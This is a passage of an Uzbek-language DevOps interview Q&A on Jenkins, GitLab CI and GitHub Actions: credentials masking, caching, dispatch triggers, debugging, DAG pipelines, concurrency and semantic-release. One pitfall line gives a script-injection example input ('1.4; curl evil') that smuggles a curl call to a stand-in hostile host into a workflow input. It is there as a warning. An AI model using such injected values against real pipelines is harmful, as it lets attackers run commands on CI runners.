- Agent pod controller'ga ulana olmaydi (Jenkins URL/tunnel, WebSocket sozlamasi) — pod `Pending`/`Error` va build osiladi.
- Har build'da dependency'larni qayta yuklash — PVC cache yoki pull-through proxy.

**Senior nuqta:** Agent'larni alohida namespace va node pool'da, minimal ServiceAccount va NetworkPolicy bilan ishlat. Controller'da `numExecutors: 0` — build'lar faqat ephemeral pod'larda.

40621.a:
**Qisqa javob:** Credential'ni `withCredentials` (yoki declarative `environment { X = credentials('id') }`) bilan bog'la — Jenkins qiymatni konsol log'ida `****` bilan maskalaydi. Shell buyruqqa esa Groovy interpolatsiyasi (`"${TOKEN}"`) bilan emas, single quote ichida shell o'zgaruvchisi (`'$TOKEN'`) sifatida ber.

**Muammo:** Groovy double-quote string'i qiymatni buyruq matniga joylaydi — buyruq matni build log'ida, process ro'yxatida (`ps`) va Jenkins ogohlantirishida ko'rinadi.

**Qanday ishlaydi:**
```
withCredentials -> TOKEN env var (faqat blok ichida)
sh 'curl -H "Authorization: Bearer $TOKEN" ...'
   -> shell o'zi env'dan o'qiydi, Groovy matnga yozmaydi    (xavfsiz)
sh "curl -H 'Authorization: Bearer ${TOKEN}' ..."
   -> Groovy qiymatni matnga yozadi -> log/ps'da ko'rinishi mumkin (xavfli)
```

**Amalda:**
```groovy
stage('Publish') {
  steps {
    withCredentials([
      string(credentialsId: 'npm-token', variable: 'NPM_TOKEN'),
      usernamePassword(credentialsId: 'registry', usernameVariable: 'REG_USER', passwordVariable: 'REG_PASS'),
      file(credentialsId: 'kubeconfig-prod', variable: 'KUBECONFIG')
    ]) {
      sh '''
        echo "$REG_PASS" | docker login ghcr.io -u "$REG_USER" --password-stdin
        npm publish --//registry.npmjs.org/:_authToken="$NPM_TOKEN"
      '''
    }
  }
}
```
Jenkins double-quote'da secret aniqlasa ogohlantiradi: `Warning: A secret was passed to "sh" using Groovy String interpolation, which is insecure.`

**Tuzoqlar:**
- `set -x` — buyruqlar argumentlari bilan chop etiladi.
- `docker login -p $PASS` — `ps` da ko'rinadi; `--password-stdin` ishlat.
- Maskalash faqat aniq qiymatni ushlaydi — base64 yoki qismi chiqsa oqadi.
- Credential'ni faylga yozib artifact qilib arxivlash.

**Senior nuqta:** Credential scope'ini cheklab (folder darajasidagi credential'lar), statik secret o'rniga Vault yoki cloud OIDC orqali qisqa muddatli token ol. Log maskalash — oxirgi himoya, asosiy emas.

40623.a:
**Qisqa javob:** Blue Ocean — Jenkins uchun 2016-yilda chiqqan zamonaviy UI: pipeline'larni vizual graf ko'rinishida, parallel stage'lar va xato nuqtasi bilan ko'rsatadi, pipeline editor va GitHub integratsiyasiga ega. Hozir yangi funksiya qo'shilmaydi (faqat xavfsizlik tuzatishlari); Jenkins o'zining standart UI'sini yangilayapti.

**Holat (2025-2026):**
| | Blue Ocean | Muqobil |
|---|---|---|
| Rivojlanish | To'xtagan, yangi funksiya yo'q | Pipeline Graph View plugin |
| Visual graf | Bor | Pipeline Graph View, Pipeline Stage View |
| Editor | Bor (cheklangan) | Jenkinsfile'ni IDE'da yozish |

**Qanday ishlaydi:**
```
Classic UI: matnli console log, job ro'yxati
Blue Ocean: /blue/organizations/jenkins/api/detail/main/42/pipeline
   [Checkout] -> [Build] -> [Test: unit | e2e] -> [Deploy]
                                        ^ qizil: shu yerda yiqildi, log shu step'niki
```

**Amalda:**
```bash
# o'rnatish (agar kerak bo'lsa)
jenkins-plugin-cli --plugins blueocean
# zamonaviy alternativa
jenkins-plugin-cli --plugins pipeline-graph-view
```
Pipeline Graph View o'rnatilgach build sahifasida "Pipeline Overview" tab paydo bo'ladi.

**Tuzoqlar:**
- Yangi o'rnatishlarda Blue Ocean'ga tayanish — kelajakda qo'llab-quvvatlanmasligi mumkin.
- Blue Ocean ko'p plugin'larni (bog'liqliklar) olib keladi — hujum yuzasi va upgrade muammolari.
- Ba'zi job turlari (freestyle) Blue Ocean'da to'liq ko'rinmaydi.

**Senior nuqta:** Plugin tanlashda faollik va maintainer holatiga qara — Jenkins muammolarining katta qismi tashlab ketilgan plugin'lardan. Kamroq plugin = oson upgrade va xavfsizroq controller.

40624.a:
**Qisqa javob:** GitLab'da `cache` — pipeline'lar orasida (va job'lar orasida) qayta ishlatiladigan dependency'lar uchun, best-effort: bo'lmasa ham job ishlashi kerak. `artifacts` — job natijalari (binary, hisobot), bir pipeline ichida keyingi stage'larga kafolatli uzatiladi va GitLab'da yuklab olish uchun saqlanadi.

**Farq:**
| | cache | artifacts |
|---|---|---|
| Maqsad | Tezlik | Natija uzatish |
| Kafolat | Yo'q (runner'da bo'lmasligi mumkin) | Bor |
| Saqlanishi | Runner lokal yoki S3/GCS (distributed cache) | GitLab server |
| Ko'lami | `key` bo'yicha pipeline'lar orasida | Pipeline ichida, UI'da yuklash |
| Muddati | Runner sozlamasi | `expire_in` |

**Qanday ishlaydi:**
```
pipeline #1: install -> cache push (key=package-lock hash)
pipeline #2: install -> cache pull -> tez
build -> artifacts: dist/ -> test va deploy job'lari avtomatik yuklab oladi
```

**Amalda:**
```yaml
variables:
  npm_config_cache: "$CI_PROJECT_DIR/.npm"

build:
  stage: build
  cache:
    key:
      files: [ package-lock.json ]
    paths: [ .npm/ ]
    policy: pull-push
  script:
    - npm ci
    - npm run build
  artifacts:
    paths: [ dist/ ]
    expire_in: 1 week
    reports:
      junit: junit.xml

test:
  stage: test
  cache:
    key: { files: [ package-lock.json ] }
    paths: [ .npm/ ]
    policy: pull           # faqat o'qiydi, yuklamaydi (tezroq)
  needs: [ build ]
  script: [ npm test ]
```

**Tuzoqlar:**
- Cache'ni build natijasini uzatish uchun ishlatish — boshqa runner'da cache yo'q, deploy bo'sh papka bilan.
- Bir nechta runner, distributed cache sozlanmagan — cache deyarli hech qachon "hit" bo'lmaydi.
- `artifacts` ga `node_modules` qo'yish — ulkan yuklash.
- `expire_in` yo'q — disk to'ladi.

**Senior nuqta:** Cache key'ni lockfile'ga bog'la va o'qiydigan job'larda `policy: pull` qo'y. Hisobotlar uchun `artifacts:reports` (junit, coverage) — MR'da natijalar ko'rinadi.

40625.a:
**Qisqa javob:** `hashFiles()` — GitHub Actions ifoda funksiyasi: berilgan glob pattern'ga mos fayllarning birlashtirilgan SHA-256 hash'ini qaytaradi. Asosan cache key yasash uchun: lockfile o'zgarsa hash o'zgaradi, cache key yangilanadi va eski dependency cache'i ishlatilmaydi.

**Qanday ishlaydi:**
```
hashFiles('**/package-lock.json')
  -> workspace'dagi barcha mos fayllar (tartiblangan)
  -> har biri sha256 -> birlashtirilgan sha256
  -> "a3f9c1..."
key = npm-Linux-a3f9c1...
lockfile o'zgarmadi -> key bir xil -> cache hit
lockfile o'zgardi  -> yangi key -> miss -> restore-keys (qisman) -> install -> yangi save
fayl topilmasa -> bo'sh string ''
```

**Amalda:**
```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/.cache/go-build
      ~/go/pkg/mod
    key: go-${{ runner.os }}-${{ hashFiles('**/go.sum') }}
    restore-keys: |
      go-${{ runner.os }}-
```
Bir nechta pattern:
```yaml
key: deps-${{ hashFiles('**/package-lock.json', '.nvmrc') }}
```
Ko'p `setup-*` action'larda bu ichida bor: `actions/setup-node@v4` `cache: npm` — o'zi lockfile hash'idan foydalanadi.

**Tuzoqlar:**
- `actions/checkout` dan oldin chaqirish — fayllar yo'q, bo'sh hash, hamma run bir xil key.
- `**/package-lock.json` `node_modules` ichidagi lockfile'larni ham qamrashi mumkin (agar mavjud bo'lsa) — aniqroq path ber.
- Faqat `runs-on` ichidagi workspace (`GITHUB_WORKSPACE`) bo'yicha ishlaydi.
- OS'ni key'ga qo'shmaslik — Linux cache'i macOS job'ida tiklanib buziladi.

**Senior nuqta:** Yaxshi cache key = "nimani cache'layapman, u nimaga bog'liq": lockfile + OS + til versiyasi. `restore-keys` qisman tiklashni beradi, lekin eskirgan cache'ni ham tiklaydi — cache hajmi o'sib ketmasligini kuzat.

40626.a:
**Qisqa javob:** `workflow_dispatch` — workflow'ni qo'lda ishga tushirish trigger'i: GitHub UI'dagi "Run workflow" tugmasi, `gh` CLI yoki REST API orqali. Typed input'lar (`string`, `choice`, `boolean`, `number`, `environment`) qabul qiladi — masalan qaysi muhitga, qaysi versiyani deploy qilish.

**Nega kerak:** Har narsa push bilan bo'lmaydi: qo'lda rollback, ma'lumotlar bazasini qayta indekslash, bir martalik skript, hotfix deploy.

**Qanday ishlaydi:**
```
UI: Actions -> workflow -> "Run workflow" -> branch + input'lar
CLI: gh workflow run deploy.yml -f env=prod -f version=1.4.2
API: POST /repos/{o}/{r}/actions/workflows/deploy.yml/dispatches
   -> run (event = workflow_dispatch, inputs.*)
```

**Amalda:**
```yaml
name: deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        type: environment
        required: true
      version:
        type: string
        description: Image tag (masalan 1.4.2)
        required: true
      dry_run:
        type: boolean
        default: true
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: ./deploy.sh "$VERSION" "$DRY_RUN"
        env:
          VERSION: ${{ inputs.version }}
          DRY_RUN: ${{ inputs.dry_run }}
```
```bash
gh workflow run deploy.yml -f environment=staging -f version=1.4.2 -f dry_run=false
gh run watch
```

**Tuzoqlar:**
- Workflow fayli default branch'da bo'lmasa — UI'da "Run workflow" tugmasi ko'rinmaydi.
- Input'ni to'g'ridan-to'g'ri `run:` ichiga `${{ inputs.version }}` qilib qo'yish — script injection (`1.4; curl evil`). `env:` orqali ber va validatsiya qil.
- Input'lar soni cheklangan (25 tagacha) va payload hajmi chegaralangan.

**Senior nuqta:** Qo'lda ishga tushirish ham audit qilinadi (kim, qachon, qaysi input) — environment protection bilan birlashtirib, prod uchun tasdiq talab qil. Rollback runbook'ini `workflow_dispatch` ga aylantir — insident paytida qo'lda buyruq terish xatosini kamaytiradi.

40627.a:
**Qisqa javob:** `repository_dispatch` — tashqi tizim GitHub REST API'ga POST so'rov yuborib, ixtiyoriy `event_type` va JSON `client_payload` bilan workflow'ni ishga tushiradigan trigger. Repo'lar orasida yoki tashqi servis (CMS, monitoring, boshqa CI) dan hodisa uzatish uchun.

**workflow_dispatch'dan farqi:**
| | workflow_dispatch | repository_dispatch |
|---|---|---|
| Kim chaqiradi | Odam (UI) yoki API | Asosan tizimlar (API) |
| Qaysi workflow | Aniq bitta fayl | `event_type` ga obuna bo'lgan hammasi |
| Parametrlar | Typed input'lar | Erkin JSON `client_payload` |
| Branch | Tanlanadi | Har doim default branch |

**Qanday ishlaydi:**
```
library repo release -> POST /repos/acme/app/dispatches
   {"event_type":"lib-released","client_payload":{"version":"2.1.0"}}
        v
app repo: on.repository_dispatch.types: [lib-released] -> workflow
   github.event.client_payload.version == "2.1.0"
```

**Amalda:**
```bash
curl -X POST https://api.github.com/repos/acme/app/dispatches \
  -H "Authorization: Bearer $GH_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  -d '{"event_type":"lib-released","client_payload":{"version":"2.1.0"}}'
# javob: 204 No Content
```
```yaml
on:
  repository_dispatch:
    types: [lib-released]
jobs:
  bump:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./bump-lib.sh "$VERSION"
        env:
          VERSION: ${{ github.event.client_payload.version }}
```

**Tuzoqlar:**
- Workflow default branch'da bo'lishi shart — boshqa branch'da test qilib bo'lmaydi.
- Token huquqi: chaqiruvchi token target repo'ga `contents: write` (fine-grained PAT) yoki GitHub App kerak — ortiqcha keng PAT ishlatmaslik.
- `client_payload` ishonchsiz ma'lumot — shell'ga to'g'ridan-to'g'ri qo'yma.
- Javob 204 — workflow haqiqatan boshlandimi, run ID qaytmaydi.

**Senior nuqta:** Repo'lar orasidagi bog'lanish uchun PAT o'rniga GitHub App token (`actions/create-github-app-token`) ishlat — qisqa muddatli va aniq scope. Ko'p repo bog'liqligida Renovate kabi tool ko'pincha soddaroq.

40628.a:
**Qisqa javob:** Debug bosqichlari: 1) yiqilgan step log'ini o'qish (`gh run view --log-failed`); 2) diagnostik log'ni yoqish — `ACTIONS_STEP_DEBUG=true` va `ACTIONS_RUNNER_DEBUG=true` (secret yoki variable) yoki "Re-run with debug logging"; 3) kontekstni chop etish; 4) lokal takrorlash (`act`); 5) oxirgi chora — interaktiv SSH (`tmate`) runner'ga.

**Qanday ishlaydi:**
```
xato -> log o'qish -> takrorlanadimi?
  ha  -> debug logging bilan re-run -> kontekst/env dump
      -> lokal act yoki konteynerda takrorlash
      -> hali noaniq -> tmate bilan runner ichiga kirish
  yo'q (flaky) -> retry statistikasi, vaqt/tarmoq bog'liqligi
```

**Amalda:**
```bash
gh run list --workflow ci.yml --limit 5
gh run view 123456789 --log-failed
gh run rerun 123456789 --debug          # debug logging bilan qayta
```
```yaml
- name: Kontekstni ko'rish
  run: |
    echo '${{ toJSON(github.event) }}' | jq '.pull_request.head.ref, .action'
    env | sort | grep -v -i token
- name: Interaktiv debug (faqat qo'lda ishga tushirilganda)
  if: ${{ failure() && github.event_name == 'workflow_dispatch' }}
  uses: mxschmitt/action-tmate@v3
  with: { limit-access-to-actor: true }
```
Lokal: `act pull_request -j test` (Docker'da, runner image'ga o'xshash, lekin 100% emas).
Workflow sintaksisini tekshirish: `actionlint`.

**Tuzoqlar:**
- `toJSON(secrets)` yoki `env` ni to'liq chop etish — secret'lar maskalanadi, lekin hosilalari oqadi.
- `tmate` ni `limit-access-to-actor` siz — SSH ulanish satri log'da, istalgan kishi kirishi mumkin (public repo!).
- Lokal `act` muvaffaqiyatli, lekin CI'da yiqiladi — runner image, tarmoq, permissions farqi.

**Senior nuqta:** Debug vaqtini kamaytirishning eng yaxshi yo'li — mantiqni YAML'dan skriptga chiqarish: skript lokal ishlaydi va test qilinadi, YAML esa faqat chaqiradi. `actionlint` ni pre-commit'ga qo'sh.

40630.a:
**Qisqa javob:** GitLab DAG (Directed Acyclic Graph) pipeline — job'larda `needs:` ishlatiladi: job stage tartibini kutmasdan, faqat o'zi bog'liq bo'lgan job'lar tugashi bilan boshlanadi. Natijada mustaqil zanjirlar parallel ketadi va pipeline umumiy vaqti qisqaradi.

**Qanday ishlaydi:**
```
Stage modeli:
  build: [build-api 2m] [build-web 10m]
  test:  [test-api] [test-web]        <- test-api ham 10m kutadi!
DAG (needs):
  build-api 2m -> test-api -> deploy-api
  build-web 10m -> test-web -> deploy-web
  test-api build-web'ni kutmaydi
```

**Amalda:**
```yaml
stages: [build, test, deploy]

build-api:
  stage: build
  script: [ make -C api build ]
  artifacts: { paths: [ api/bin/ ] }

build-web:
  stage: build
  script: [ make -C web build ]
  artifacts: { paths: [ web/dist/ ] }

test-api:
  stage: test
  needs: [ build-api ]           # faqat shu artifact'lar yuklanadi
  script: [ make -C api test ]

lint:
  stage: test
  needs: []                      # darhol, pipeline boshida
  script: [ make lint ]

deploy-api:
  stage: deploy
  needs:
    - job: test-api
    - job: build-api
      artifacts: true
  script: [ ./deploy.sh api ]
```
Pipeline sahifasida "Job dependencies" ko'rinishi grafni ko'rsatadi.

**Tuzoqlar:**
- `needs` bor job'lar faqat ko'rsatilgan job'lardan artifact oladi — kerakli artifact job'ini `needs` ga qo'shishni unutish.
- `needs` dagi job `rules` tufayli pipeline'da yo'q bo'lsa — xato; `optional: true` qo'y.
- `needs` soni chegaralangan (default 50 tagacha).

**Senior nuqta:** Monorepo'da DAG + `rules:changes` birga juda samarali: o'zgarmagan servis zanjiri umuman ishlamaydi, o'zgarganlari parallel ketadi. Kritik yo'lni (eng uzun zanjir) qisqartirish — pipeline optimizatsiyasining asosiy usuli.

40631.a:
**Qisqa javob:** Concurrency group — GitHub Actions'da nomlangan guruh: bir guruhda bir vaqtda faqat bitta run (yoki job) ishlaydi. Yangi run kelganda — `cancel-in-progress: true` bo'lsa eskisi bekor qilinadi, `false` bo'lsa yangisi navbatda kutadi (pending). Navbatda faqat bitta pending saqlanadi.

**Qanday ishlaydi:**
```
group: deploy-production, cancel-in-progress: false
  run#1 ishlayapti
  run#2 keldi -> pending
  run#3 keldi -> run#2 bekor (pending o'rnini run#3 oladi)
  run#1 tugadi -> run#3 boshlanadi
(oraliq versiyalar o'tkazib yuboriladi - eng oxirgisi deploy qilinadi)
```

**Amalda:**
```yaml
# workflow darajasi: PR'dagi eskirgan CI'ni bekor qil
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    # job darajasi: deploy'larni ketma-ket qil, uzma
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - run: ./deploy.sh
```
Run sahifasida: `Canceling since a higher priority waiting request for 'ci-refs/heads/feat' exists`.

**Group nomini tanlash:**
| Maqsad | Group |
|---|---|
| Har branch/PR uchun bitta CI | `${{ github.workflow }}-${{ github.ref }}` |
| Butun repo bo'yicha bitta deploy | `deploy-prod` |
| Terraform stack bo'yicha | `tf-${{ inputs.stack }}` |

**Tuzoqlar:**
- `github.ref` PR'da `refs/pull/42/merge` — to'g'ri; lekin `github.head_ref` faqat PR'da bor, push'da bo'sh — guruhlar aralashadi.
- Workflow darajasidagi `cancel-in-progress: true` deploy job'ini ham uzadi.
- Navbatda faqat bitta pending — "hamma deploy'lar ketma-ket bajarilsin" kerak bo'lsa bu mos emas (GitHub 2025 da `queue` variantini qo'shishni e'lon qilgan bo'lsa ham, hujjatni tekshir).

**Senior nuqta:** CI uchun bekor qilish, holat o'zgartiruvchi operatsiyalar uchun navbat — bu qoidani jamoa shablonlariga kirit. Deploy'lar o'rtasida race bo'lmasligi uchun deploy skriptida ham versiya monotonligini tekshir.

40632.a:
**Qisqa javob:** GitLab CI'da semantic release: `main` ga merge bo'lgach release job'i `semantic-release` (yoki `release-please`, `cocogitto`) ishga tushiradi: Conventional Commits'ni tahlil qilib keyingi versiyani hisoblaydi, Git tag yaratadi, CHANGELOG yozadi, GitLab Release yaratadi va paketni publish qiladi.

**Qanday ishlaydi:**
```
oxirgi tag v1.4.2
commit'lar: fix(api): ..., feat(ui): ...
   -> eng yuqori: feat -> MINOR -> v1.5.0
   -> CHANGELOG.md yangilanadi
   -> git tag v1.5.0 + push
   -> GitLab Release (release notes)
   -> npm/registry publish
tag pipeline -> build va deploy v1.5.0
```

**Amalda:**
```json
// .releaserc.json
{
  "branches": ["main"],
  "plugins": [
    "@semantic-release/commit-analyzer",
    "@semantic-release/release-notes-generator",
    ["@semantic-release/changelog", { "changelogFile": "CHANGELOG.md" }],
    "@semantic-release/npm",
    "@semantic-release/gitlab",
    ["@semantic-release/git", { "assets": ["CHANGELOG.md", "package.json"] }]
  ]
}
```
```yaml
release:
  stage: release
  image: node:22
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  variables:
    GIT_DEPTH: 0             # to'liq tarix va tag'lar kerak
  script:
    - npm ci
    - npx semantic-release
```
`GITLAB_TOKEN` (project access token, `api` + `write_repository`) CI variable sifatida, Protected + Masked.

**Tuzoqlar:**
- Shallow clone (`GIT_DEPTH` default 20/50) — oldingi tag topilmaydi, versiya noto'g'ri.
- Release job yaratgan commit (`chore(release)`) yana pipeline qo'zg'atadi — `[skip ci]` yoki `rules` bilan cheklash.
- Squash merge'da MR sarlavhasi conventional bo'lmasa — reliz chiqmaydi.
- Token protected bo'lmasa — har branch'dagi job tag yarata oladi.

**Senior nuqta:** Release'ni bitta joydan (faqat `main`, protected runner) qil va tag pipeline'da artifact'ni build qil — versiya va artifact bog'liq bo'ladi. Monorepo uchun release-please yoki changesets har paketni alohida boshqaradi.

40634.a:
**Qisqa javob:** Controller (oldingi nomi "master") — Jenkins'ning "miyasi": web UI, konfiguratsiya, job'lar va build tarixi, plugin'lar, pipeline'ni parse va rejalashtirish. Agent (oldingi "slave") — build step'larini haqiqatda bajaradigan worker (VM, konteyner, pod). Controller'da build ishlatmaslik kerak: `numExecutors: 0`.

**Qanday ishlaydi:**
```
            +----------------------+
            | Controller           |  UI, queue, scheduler,
            | (JENKINS_HOME)       |  credential'lar, plugin'lar
            +----------------------+
               |  remoting (inbound TCP/WebSocket yoki SSH)
     +---------+----------+-------------+
     v                    v             v
 agent linux-1      agent windows    k8s pod (ephemeral)
 label: linux go    label: windows   label: docker
```

**Amalda:**
```groovy
pipeline {
  agent { label 'linux && go' }    // label bo'yicha agent tanlash
  stages { stage('Build') { steps { sh 'go build ./...' } } }
}
```
```yaml
# JCasC: controller'da executor yo'q
jenkins:
  numExecutors: 0
  nodes:
    - permanent:
        name: linux-1
        labelString: "linux go"
        remoteFS: /home/jenkins
        launcher:
```
